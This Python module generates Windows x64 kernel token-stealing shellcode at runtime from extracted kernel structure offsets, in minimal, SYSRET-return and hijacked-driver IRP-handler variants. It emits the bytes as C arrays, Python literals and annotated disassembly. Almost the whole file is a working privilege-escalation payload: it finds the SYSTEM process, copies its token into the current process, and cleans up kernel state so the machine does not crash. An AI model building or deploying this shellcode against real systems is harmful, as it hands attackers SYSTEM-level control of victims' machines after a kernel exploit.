"""x64 token-stealing shellcode generator.

Builds machine code at runtime using offsets that have been extracted
dynamically from the live target by `offset_extractor`. Two variants:

- ``minimal`` — standalone primitive: walks ActiveProcessLinks to find
  PID 4 (SYSTEM), copies its Token into the current EPROCESS, returns
  STATUS_SUCCESS. ~62 bytes.

- ``irp`` — designed to be invoked from a hijacked driver IRP handler.
  Restores ``r11`` from ``[rsp+0x40]`` (the original IRP pointer), zeros
  out callee-save registers so we can ``ret`` back into the kernel
  without BSOD'ing on stale state, and adjusts the saved RIP via
  ``sub rsi, <ret_offset>`` so the ``ret`` jumps back into the host
  function past the patched site.

The generator emits the bytes plus a parallel disassembly listing so the
caller can pretty-print both.
"""

import struct


# ---------------------------------------------------------------------------
# tiny x64 emitter — only the encodings we need
# ---------------------------------------------------------------------------

class _Emitter:
    def __init__(self):
        self.buf = bytearray()
        # list of (offset_in_buf, length, asm_str, comment)
        self.lines = []

    def _emit(self, raw: bytes, asm: str, comment: str = ""):
        off = len(self.buf)
        self.buf.extend(raw)
        self.lines.append((off, len(raw), asm, comment))

    # --- instructions ---

    def mov_rax_gs_188(self):
        # 65 48 8B 04 25 88 01 00 00
        self._emit(
            b"\x65\x48\x8b\x04\x25\x88\x01\x00\x00",
            "mov  rax, gs:[0x188]",
            "KPCR.PRCB.CurrentThread (KTHREAD*)",
        )

    def mov_rax_rax_disp32(self, disp: int, comment: str = ""):
        # 48 8B 80 disp32
        raw = b"\x48\x8b\x80" + struct.pack("<i", disp)
        self._emit(raw, f"mov  rax, [rax+{disp:#x}]", comment)

    def mov_rcx_rax(self):
        # 48 89 C1
        self._emit(b"\x48\x89\xc1", "mov  rcx, rax", "rcx = current EPROCESS")

    def sub_rax_imm32(self, imm: int, comment: str = ""):
        # 48 2D imm32  (rax-only short form)
        raw = b"\x48\x2d" + struct.pack("<i", imm)
        self._emit(raw, f"sub  rax, {imm:#x}", comment)

    def cmp_qword_rax_disp32_imm8(self, disp: int, imm: int, comment: str = ""):
        # 48 83 B8 disp32 imm8
        raw = b"\x48\x83\xb8" + struct.pack("<i", disp) + bytes([imm & 0xFF])
        self._emit(raw, f"cmp  qword [rax+{disp:#x}], {imm}", comment)

    def jne_rel8_to(self, target_offset: int, comment: str = ""):
        # 75 rel8 — target is an absolute offset within self.buf
        rel = target_offset - (len(self.buf) + 2)
        if not (-128 <= rel <= 127):
            raise ValueError(f"jne rel8 out of range: {rel}")
        raw = b"\x75" + struct.pack("<b", rel)
        self._emit(raw, f"jne  {target_offset:#x}", comment)

    def mov_rdx_rax_disp32(self, disp: int, comment: str = ""):
        # 48 8B 90 disp32
        raw = b"\x48\x8b\x90" + struct.pack("<i", disp)
        self._emit(raw, f"mov  rdx, [rax+{disp:#x}]", comment)

    def and_dl_imm8(self, imm: int, comment: str = ""):
        raw = b"\x80\xe2" + bytes([imm & 0xFF])
        self._emit(raw, f"and  dl, {imm:#x}", comment)

    def mov_rcx_disp32_rdx(self, disp: int, comment: str = ""):
        # 48 89 91 disp32   ; mov [rcx+disp], rdx
        raw = b"\x48\x89\x91" + struct.pack("<i", disp)
        self._emit(raw, f"mov  [rcx+{disp:#x}], rdx", comment)

    def xor_eax_eax(self, comment: str = "STATUS_SUCCESS"):
        self._emit(b"\x33\xc0", "xor  eax, eax", comment)

    def ret(self, comment: str = ""):
        self._emit(b"\xc3", "ret", comment)

    # ---- IRP variant helpers ----

    def mov_rsi_r8(self):
        self._emit(b"\x4c\x89\xc6", "mov  rsi, r8", "rsi = saved RIP")

    def sub_rsi_imm32(self, imm: int, comment: str = ""):
        # 48 81 EE imm32
        raw = b"\x48\x81\xee" + struct.pack("<i", imm)
        self._emit(raw, f"sub  rsi, {imm:#x}", comment)

    def mov_r11_rsp_disp8(self, disp: int = 0x40, comment: str = ""):
        # 4C 8B 5C 24 40   ; mov r11, [rsp+0x40]
        raw = b"\x4c\x8b\x5c\x24" + bytes([disp & 0xFF])
        self._emit(raw, f"mov  r11, [rsp+{disp:#x}]", comment)

    def mov_r9_gs_188(self):
        self._emit(
            b"\x65\x4c\x8b\x0c\x25\x88\x01\x00\x00",
            "mov  r9, gs:[0x188]",
            "KTHREAD",
        )

    def mov_r9_r9_disp32(self, disp: int, comment: str = ""):
        # 4D 8B 89 disp32
        raw = b"\x4d\x8b\x89" + struct.pack("<i", disp)
        self._emit(raw, f"mov  r9, [r9+{disp:#x}]", comment)

    def xor_reg_self(self, reg: str):
        # zeroing the callee-saves so we can ret without leaking state
        encs = {
            "r9":  (b"\x4d\x31\xc9", "xor  r9, r9"),
            "r10": (b"\x4d\x31\xd2", "xor  r10, r10"),
            "r11": (b"\x4d\x31\xdb", "xor  r11, r11"),
            "r12": (b"\x4d\x31\xe4", "xor  r12, r12"),
            "r13": (b"\x4d\x31\xed", "xor  r13, r13"),
            "r14": (b"\x4d\x31\xf6", "xor  r14, r14"),
            "r15": (b"\x4d\x31\xff", "xor  r15, r15"),
            "edi": (b"\x31\xff",     "xor  edi, edi"),
        }
        raw, asm = encs[reg]
        self._emit(raw, asm, "")

    # ---- SYSRET variant helpers ----

    def mov_r8_rax(self):
        self._emit(b"\x4c\x89\xc0", "mov  r8, rax", "preserve current EPROCESS")

    def mov_r8_r8_disp32(self, disp: int, comment: str = ""):
        # 4D 8B 80 disp32
        raw = b"\x4d\x8b\x80" + struct.pack("<i", disp)
        self._emit(raw, f"mov  r8, [r8+{disp:#x}]", comment)

    def sub_r8_imm32(self, imm: int, comment: str = ""):
        # 49 81 E8 imm32
        raw = b"\x49\x81\xe8" + struct.pack("<i", imm)
        self._emit(raw, f"sub  r8, {imm:#x}", comment)

    def mov_r9_r8_disp32(self, disp: int, comment: str = ""):
        # 4D 8B 88 disp32
        raw = b"\x4d\x8b\x88" + struct.pack("<i", disp)
        self._emit(raw, f"mov  r9, [r8+{disp:#x}]", comment)

    def cmp_r9_imm8(self, imm: int, comment: str = ""):
        # 41 83 F9 imm8
        raw = b"\x41\x83\xf9" + bytes([imm & 0xFF])
        self._emit(raw, f"cmp  r9, {imm}", comment)

    def jnz_rel8_to(self, target_offset: int, comment: str = ""):
        # 75 rel8
        rel = target_offset - (len(self.buf) + 2)
        if not (-128 <= rel <= 127):
            raise ValueError(f"jnz rel8 out of range: {rel}")
        raw = b"\x75" + struct.pack("<b", rel)
        self._emit(raw, f"jnz  {target_offset:#x}", comment)

    def mov_rcx_r8_disp32(self, disp: int, comment: str = ""):
        # 49 8B 88 disp32
        raw = b"\x49\x8b\x88" + struct.pack("<i", disp)
        self._emit(raw, f"mov  rcx, [r8+{disp:#x}]", comment)

    def and_cl_imm8(self, imm: int, comment: str = ""):
        raw = b"\x80\xe1" + bytes([imm & 0xFF])
        self._emit(raw, f"and  cl, {imm:#x}", comment)

    def mov_rax_disp32_rcx(self, disp: int, comment: str = ""):
        # 48 89 88 disp32
        raw = b"\x48\x89\x88" + struct.pack("<i", disp)
        self._emit(raw, f"mov  [rax+{disp:#x}], rcx", comment)

    def mov_cx_rax_disp32(self, disp: int, comment: str = ""):
        # 66 8B 88 disp32
        raw = b"\x66\x8b\x88" + struct.pack("<i", disp)
        self._emit(raw, f"mov  cx, [rax+{disp:#x}]", comment)

    def inc_cx(self):
        self._emit(b"\x66\xff\xc1", "inc  cx", "")

    def mov_rax_disp32_cx(self, disp: int, comment: str = ""):
        # 66 89 88 disp32
        raw = b"\x66\x89\x88" + struct.pack("<i", disp)
        self._emit(raw, f"mov  [rax+{disp:#x}], cx", comment)

    def mov_rdx_rax_disp32_alt(self, disp: int, comment: str = ""):
        # 48 8B 90 disp32 (different encoding for readability)
        raw = b"\x48\x8b\x90" + struct.pack("<i", disp)
        self._emit(raw, f"mov  rdx, [rax+{disp:#x}]", comment)

    def mov_rcx_rdx_disp32(self, disp: int, comment: str = ""):
        # 48 8B 8A disp32
        raw = b"\x48\x8b\x8a" + struct.pack("<i", disp)
        self._emit(raw, f"mov  rcx, [rdx+{disp:#x}]", comment)

    def mov_r11_rdx_disp32(self, disp: int, comment: str = ""):
        # 4C 8B 9A disp32
        raw = b"\x4c\x8b\x9a" + struct.pack("<i", disp)
        self._emit(raw, f"mov  r11, [rdx+{disp:#x}]", comment)

    def mov_rsp_rdx_disp32(self, disp: int, comment: str = ""):
        # 48 8B A2 disp32
        raw = b"\x48\x8b\xa2" + struct.pack("<i", disp)
        self._emit(raw, f"mov  rsp, [rdx+{disp:#x}]", comment)

    def mov_rbp_rdx_disp32(self, disp: int, comment: str = ""):
        # 48 8B AA disp32
        raw = b"\x48\x8b\xaa" + struct.pack("<i", disp)
        self._emit(raw, f"mov  rbp, [rdx+{disp:#x}]", comment)

    def swapgs(self):
        self._emit(b"\x0f\x01\xf8", "swapgs", "")

    def sysret(self):
        # o64 sysret = REX.W + 0F 07
        self._emit(b"\x48\x0f\x07", "sysret", "return to userland")


# ---------------------------------------------------------------------------
# Public API: build a shellcode with the given offsets
# ---------------------------------------------------------------------------

def build_minimal(*, kthread_process: int, active_process_links: int,
                  unique_process_id: int, token: int):
    """Build the minimal token-stealer.

    All offsets are EPROCESS / KTHREAD field offsets — pass the values
    extracted by ``offset_extractor`` for the live target.

    Returns (bytes, lines) where ``lines`` is a list of
    (offset, length, asm, comment) tuples for pretty-printing.
    """
    e = _Emitter()

    e.mov_rax_gs_188()
    e.mov_rax_rax_disp32(kthread_process, "KTHREAD.Process -> EPROCESS")
    e.mov_rcx_rax()  # save current EPROCESS in rcx

    loop_start = len(e.buf)
    e.mov_rax_rax_disp32(active_process_links,
                         "ActiveProcessLinks.Flink -> next entry")
    e.sub_rax_imm32(active_process_links, "back to EPROCESS base")
    e.cmp_qword_rax_disp32_imm8(unique_process_id, 4,
                                "UniqueProcessId == 4 (SYSTEM)?")
    e.jne_rel8_to(loop_start, "loop until SYSTEM found")

    e.mov_rdx_rax_disp32(token, "rdx = SYSTEM->Token (raw EX_FAST_REF)")
    e.and_dl_imm8(0xF0, "clear refcount nibble (optional)")
    e.mov_rcx_disp32_rdx(token, "current->Token = SYSTEM->Token")

    e.xor_eax_eax()
    e.ret()

    return bytes(e.buf), e.lines


def build_sysret(*, kthread_process: int, active_process_links: int,
                 unique_process_id: int, token: int,
                 kernel_apc_disable: int, ethread_trap_frame: int,
                 trap_frame_rbp: int, trap_frame_rip: int,
                 trap_frame_eflags: int, trap_frame_rsp: int):
    """Build SYSRET variant for proper userland return.

    This variant performs token stealing then does a full trap frame
    restoration and clean SYSRET back to userland. Suitable when the
    shellcode is triggered from kernel context and needs to return
    control to the original userland thread.
    """
    e = _Emitter()

    # Get current EPROCESS and preserve it in rbx
    e.mov_rax_gs_188()
    e.mov_rax_rax_disp32(kthread_process, "KPCRB.CurrentThread -> current EPROCESS")
    e._emit(b"\x48\x89\xc3", "mov  rbx, rax", "preserve current EPROCESS in rbx")

    # Use r8 for the SYSTEM search loop
    e._emit(b"\x4c\x89\xc0", "mov  r8, rax", "r8 = starting point for loop")

    # Loop to find SYSTEM (PID 4)
    loop_start = len(e.buf)
    e.mov_r8_r8_disp32(active_process_links, "ActiveProcessLinks.Flink")
    e.sub_r8_imm32(active_process_links, "back to EPROCESS base")
    e.mov_r9_r8_disp32(unique_process_id, "r9 = UniqueProcessId")
    e.cmp_r9_imm8(4, "SYSTEM PID?")
    e.jnz_rel8_to(loop_start, "loop until PID == 4")

    # Token replacement: copy SYSTEM token to current process
    e.mov_rcx_r8_disp32(token, "rcx = SYSTEM token")
    e.and_cl_imm8(0xf0, "clear low 4 bits of EX_FAST_REF")
    e._emit(b"\x48\x89\x8b" + struct.pack("<i", token),
            f"mov  [rbx+{token:#x}], rcx", "current process token = SYSTEM token")

    # Cleanup: prepare for SYSRET
    e.mov_rax_gs_188()  # Get current thread again
    e.mov_cx_rax_disp32(kernel_apc_disable, "cx = KernelApcDisable")
    e.inc_cx()
    e.mov_rax_disp32_cx(kernel_apc_disable, "increment KernelApcDisable")

    # Get trap frame pointer
    e.mov_rdx_rax_disp32_alt(ethread_trap_frame, "rdx = TrapFrame pointer")

    # Restore registers from trap frame
    e.mov_rcx_rdx_disp32(trap_frame_rip, "rcx = TrapFrame.Rip")
    e.mov_r11_rdx_disp32(trap_frame_eflags, "r11 = TrapFrame.EFlags")
    e.mov_rsp_rdx_disp32(trap_frame_rsp, "rsp = TrapFrame.Rsp")
    e.mov_rbp_rdx_disp32(trap_frame_rbp, "rbp = TrapFrame.Rbp")

    # Return to userland
    e.xor_eax_eax("STATUS_SUCCESS")
    e.swapgs()
    e.sysret()

    return bytes(e.buf), e.lines


def build_irp(*, kthread_process: int, active_process_links: int,
              unique_process_id: int, token: int,
              ret_offset: int = 0xa86):
    """IRP-handler variant.

    Same primitive as ``build_minimal`` but adds the boilerplate needed
    when the shellcode runs from inside a hijacked driver IRP handler:

    - ``rsi`` is set to ``r8 - ret_offset`` (assumes the caller put the
      saved RIP in ``r8`` before transferring control); ``rsi`` is then
      pushed onto a fake stack frame so ``ret`` jumps back into the host
      function at the right place.
    - ``r11`` is restored from ``[rsp+0x40]`` (caller's IRP*) so the
      subsequent ``IofCompleteRequest`` call doesn't fault.
    - All callee-save GPRs are zeroed before ``ret`` to avoid leaking
      kernel state into wherever we return.
    - ``rsi = 1`` at the end (caller's "handled" sentinel — adapt to
      whatever the host driver checks).

    The token-stealing core is identical, just uses ``r9`` as the
    KTHREAD pointer instead of ``rax`` because the IRP boilerplate
    needs ``rax`` free.
    """
    e = _Emitter()

    e.mov_rsi_r8()
    e.sub_rsi_imm32(ret_offset, "skip past patched call site")
    e.mov_r11_rsp_disp8(0x40, "restore caller's IRP*")

    # KTHREAD via r9, then EPROCESS
    e.mov_r9_gs_188()
    e.mov_r9_r9_disp32(kthread_process, "KTHREAD.Process -> EPROCESS")

    # r8 = current PID for the self-walk
    # mov r8, [r9 + UniqueProcessId]   = 4D 8B 81 disp32
    raw_r8 = b"\x4d\x8b\x81" + struct.pack("<i", unique_process_id)
    e._emit(raw_r8, f"mov  r8, [r9+{unique_process_id:#x}]",
            "r8 = current PID")

    # rax = r9 (current EPROCESS) for the first walk
    e._emit(b"\x4c\x89\xc8", "mov  rax, r9", "")

    # ----- self walk (find current via list) -----
    self_loop = len(e.buf)
    e.mov_rax_rax_disp32(active_process_links,
                         "Flink -> next entry's LIST_ENTRY")
    e.sub_rax_imm32(active_process_links, "back to EPROCESS base")
    # cmp [rax + UPI], r8        ; 4C 39 80 disp32
    raw_cmp = b"\x4c\x39\x80" + struct.pack("<i", unique_process_id)
    e._emit(raw_cmp, f"cmp  [rax+{unique_process_id:#x}], r8",
            "found current?")
    e.jne_rel8_to(self_loop)

    # rcx = &current.Token
    e._emit(b"\x48\x89\xc1", "mov  rcx, rax", "")
    # add rcx, token   ; 48 81 C1 imm32
    raw_add = b"\x48\x81\xc1" + struct.pack("<i", token)
    e._emit(raw_add, f"add  rcx, {token:#x}", "rcx = &current.Token")

    # rax = r9 (start over) for the SYSTEM walk
    e._emit(b"\x4c\x89\xc8", "mov  rax, r9", "")

    # ----- SYSTEM walk (PID 4) -----
    sys_loop = len(e.buf)
    e.mov_rax_rax_disp32(active_process_links, "Flink -> next entry")
    e.sub_rax_imm32(active_process_links, "back to EPROCESS base")
    # cmp byte [rax + UPI], 4    ; 80 B8 disp32 04
    raw_cmpb = b"\x80\xb8" + struct.pack("<i", unique_process_id) + b"\x04"
    e._emit(raw_cmpb, f"cmp  byte [rax+{unique_process_id:#x}], 4",
            "PID == SYSTEM?")
    e.jne_rel8_to(sys_loop)

    # rdx = &system.Token, then rdx = system.Token
    e._emit(b"\x48\x89\xc2", "mov  rdx, rax", "")
    raw_add2 = b"\x48\x81\xc2" + struct.pack("<i", token)
    e._emit(raw_add2, f"add  rdx, {token:#x}", "rdx = &system.Token")
    e._emit(b"\x48\x8b\x12", "mov  rdx, [rdx]", "load SYSTEM token")

    # *rcx = rdx
    e._emit(b"\x48\x89\x11", "mov  [rcx], rdx", "patch current.Token")

    # ----- BSOD-prevention exit boilerplate -----
    e._emit(b"\x29\xc0", "sub  eax, eax", "STATUS_SUCCESS")
    e._emit(b"\x4c\x89\xdb", "mov  rbx, r11", "carry IRP* into rbx")
    e.xor_reg_self("edi")
    # mov eax, 0  ; b8 00 00 00 00
    e._emit(b"\xb8\x00\x00\x00\x00", "mov  eax, 0", "")
    # sub rsp, 0x10
    e._emit(b"\x48\x83\xec\x10", "sub  rsp, 0x10", "make room for fake frame")
    # push rsi
    e._emit(b"\x56", "push rsi", "saved RIP back into kernel")
    # mov [rsp+8], rbx
    e._emit(b"\x48\x89\x5c\x24\x08", "mov  [rsp+0x8], rbx",
            "preserve IRP* across ret")
    # mov rbp, rsp
    e._emit(b"\x48\x89\xe5", "mov  rbp, rsp", "")
    for r in ("r11", "r10", "r9", "r13", "r14", "r15", "r12"):
        e.xor_reg_self(r)
    # mov rsi, 1
    e._emit(b"\x48\xc7\xc6\x01\x00\x00\x00", "mov  rsi, 1",
            "host-driver 'handled' marker")
    e.ret()

    return bytes(e.buf), e.lines


# ---------------------------------------------------------------------------
# pretty printers
# ---------------------------------------------------------------------------

def format_c_array(name: str, data: bytes, lines, header_lines):
    """Render the shellcode as an annotated C unsigned char array."""
    out = []
    for h in header_lines:
        out.append(f"// {h}")
    out.append(f"// Length: {len(data)} bytes")
    out.append(f"unsigned char {name}[] = {{")
    for off, length, asm, comment in lines:
        chunk = data[off:off + length]
        hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
        pad = " " * max(1, 50 - len(hex_bytes))
        tag = f"// {asm}" + (f"  ; {comment}" if comment else "")
        out.append(f"    {hex_bytes},{pad}{tag}")
    out.append("};")
    return "\n".join(out)


def format_python_bytes(data: bytes):
    """Render as a Python bytes literal."""
    return 'shellcode = b"' + "".join(f"\\x{b:02x}" for b in data) + '"'


def format_hex_string(data: bytes):
    return data.hex()


def format_asm_listing(lines):
    """Render the disassembly listing (offset / hex / asm / comment)."""
    out = []
    for off, length, asm, comment in lines:
        # we don't have the bytes here, so leave the hex column to the
        # caller if needed; this is just for the asm view
        line = f"  {off:04x}:  {asm:30s}"
        if comment:
            line += f"  ; {comment}"
        out.append(line)
    return "\n".join(out)
